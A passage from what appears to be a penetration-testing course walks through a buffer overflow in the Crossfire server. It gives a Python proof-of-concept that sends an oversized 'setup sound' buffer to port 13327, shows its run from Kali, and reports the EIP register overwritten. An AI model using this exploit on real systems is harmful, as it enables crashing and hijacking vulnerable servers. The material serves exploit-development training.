Once we have attached the debugger to the Crossfire application, we will use the following proof-of-concept code that we created based on information from the public exploit:

```
#!/usr/bin/python
import socket

host = "10.11.0.128"

crash = "\x41" * 4379

**buffer = "\x11(setup sound " + crash + "\x98\x08"**

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
```

Listing 367 - Proof of concept code to crash the Crossfire application

Notice that our **buffer** variable requires specific hex values at the beginning and at the end of it, as well as the "setup sound" string, in order for the application to crash.

Our initial proof-of-concept builds a malicious buffer including the "setup sound" command, connects to the remote service on port 13327, and sends the buffer.

To crash Crossfire, we can run our first proof-of-concept using **python**:

```
kali@kali:~$ python poc_01.py
[*]Sending evil buffer...
#
[*]Payload Sent !
```

Listing 368 - Running the proof-of-concept code from Kali

After running the script, the debugger displays the following error message, clearly indicating the presence of a memory corruption in the *setup sound* command, likely a buffer overflow condition:

![](bbox=[0.29, 0.73, 0.71, 0.88])

Clicking the OK button, we find that the EIP register has been overwritten with our buffer.